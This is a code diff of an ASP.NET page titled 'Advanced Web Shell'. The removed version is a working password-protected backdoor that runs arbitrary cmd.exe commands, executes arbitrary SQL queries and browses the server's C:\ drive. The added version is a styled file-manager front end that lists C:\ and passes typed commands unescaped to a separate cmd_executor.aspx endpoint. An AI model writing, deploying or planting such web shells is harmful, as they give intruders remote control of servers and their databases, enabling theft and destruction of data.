@@ -1,123 +1,95 @@
 <%@ Page Language="C#" Debug="true" %>
-<%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Data.SqlClient" %>
 
-<script runat="server">
-    private string password = "your_password"; // كلمة المرور للوصول
-    private string currentDir = "C:\\"; // مسار المجلد الحالي
-
-    protected void Page_Load(object sender, EventArgs e)
-    {
-        if (Request["key"] == password)
-        {
-            // عرض الملفات والمجلدات
-            if (Request["action"] == "list")
-            {
-                DisplayDirectory(currentDir);
-            }
-
-            // تنفيذ أوامر النظام
-            if (Request["cmd"] != null)
-            {
-                ExecuteCommand(Request["cmd"]);
-            }
-
-            // تنفيذ استعلام SQL على قاعدة بيانات
-            if (Request["sql"] != null)
-            {
-                ExecuteSQL(Request["sql"]);
-            }
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <title>Advanced Web Shell</title>
+    <style>
+        body {
+            background-color: #f5f5f5;
         }
-        else
-        {
-            Response.Write("Unauthorized access.");
+        .file-icon {
+            font-size: 60px;
+            cursor: pointer;
         }
+        .file-browser {
+            display: flex;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        .file-item {
+            text-align: center;
+            width: 120px;
+            margin: 10px;
+        }
+        pre {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2 class="text-center my-4">File Manager & Command Execution</h2>
+    
+    <div class="file-browser">
+        <% 
+            string[] dirs = Directory.GetDirectories("C:\\");
+            foreach (string dir in dirs) { 
+        %>
+        <div class="file-item">
+            <i class="fas fa-folder file-icon" onclick="openFolder('<%=dir%>')"></i>
+            <p><%= Path.GetFileName(dir) %></p>
+        </div>
+        <% } %>
+        <% 
+            string[] files = Directory.GetFiles("C:\\");
+            foreach (string file in files) { 
+        %>
+        <div class="file-item">
+            <i class="fas fa-file file-icon" onclick="openFile('<%=file%>')"></i>
+            <p><%= Path.GetFileName(file) %></p>
+        </div>
+        <% } %>
+    </div>
+
+    <div class="mt-4">
+        <h4>Execute Command</h4>
+        <input type="text" id="cmdInput" class="form-control" placeholder="Enter command">
+        <button class="btn btn-primary mt-2" onclick="executeCommand()">Execute</button>
+    </div>
+
+    <pre id="outputConsole"></pre>
+</div>
+
+<script>
+    function openFolder(path) {
+        alert("Opening folder: " + path);
+        // Implement AJAX call to load folder content
     }
 
-    // وظيفة لعرض الملفات والمجلدات
-    private void DisplayDirectory(string path)
-    {
-        DirectoryInfo dir = new DirectoryInfo(path);
-        FileInfo[] files = dir.GetFiles();
-        DirectoryInfo[] dirs = dir.GetDirectories();
-
-        Response.Write("<h2>Directory: " + path + "</h2>");
-        Response.Write("<ul>");
-        foreach (DirectoryInfo d in dirs)
-        {
-            Response.Write("<li><a href='?key=" + password + "&action=list&path=" + d.FullName + "'>" + d.Name + "</a></li>");
-        }
-        foreach (FileInfo f in files)
-        {
-            Response.Write("<li>" + f.Name + " (" + f.Length + " bytes)</li>");
-        }
-        Response.Write("</ul>");
+    function openFile(file) {
+        alert("Opening file: " + file);
+        // Implement AJAX call to read file content
     }
 
-    // وظيفة لتنفيذ أوامر النظام
-    private void ExecuteCommand(string command)
-    {
-        ProcessStartInfo psi = new ProcessStartInfo();
-        psi.FileName = "cmd.exe";
-        psi.Arguments = "/c " + command;
-        psi.RedirectStandardOutput = true;
-        psi.UseShellExecute = false;
-        psi.CreateNoWindow = true;
-
-        Process process = Process.Start(psi);
-        string output = process.StandardOutput.ReadToEnd();
-        Response.Write("<pre>" + output + "</pre>");
-    }
-
-    // وظيفة لتنفيذ أوامر SQL
-    private void ExecuteSQL(string query)
-    {
-        string connectionString = "Data Source=YOUR_SERVER;Initial Catalog=YOUR_DATABASE;User ID=YOUR_USER;Password=YOUR_DB_PASSWORD";
-        using (SqlConnection connection = new SqlConnection(connectionString))
-        {
-            try
-            {
-                connection.Open();
-                SqlCommand command = new SqlCommand(query, connection);
-                SqlDataReader reader = command.ExecuteReader();
-                while (reader.Read())
-                {
-                    for (int i = 0; i < reader.FieldCount; i++)
-                    {
-                        Response.Write(reader[i].ToString() + " ");
-                    }
-                    Response.Write("<br>");
-                }
-                reader.Close();
-            }
-            catch (Exception ex)
-            {
-                Response.Write("Error: " + ex.Message);
-            }
-        }
+    function executeCommand() {
+        var cmd = document.getElementById('cmdInput').value;
+        fetch('cmd_executor.aspx?cmd=' + cmd)
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('outputConsole').innerText = data;
+            });
     }
 </script>
 
-<html>
-<body>
-    <form method="get">
-        <input type="hidden" name="key" value="your_password" />
-        <h2>Execute Command:</h2>
-        Command: <input type="text" name="cmd" />
-        <input type="submit" value="Execute" />
-
-        <h2>SQL Query:</h2>
-        Query: <input type="text" name="sql" />
-        <input type="submit" value="Execute SQL" />
-    </form>
-
-    <h2>Browse Files:</h2>
-    <form method="get">
-        <input type="hidden" name="key" value="your_password" />
-        <input type="hidden" name="action" value="list" />
-        Path: <input type="text" name="path" value="C:\\" />
-        <input type="submit" value="Browse" />
-    </form>
 </body>
 </html>
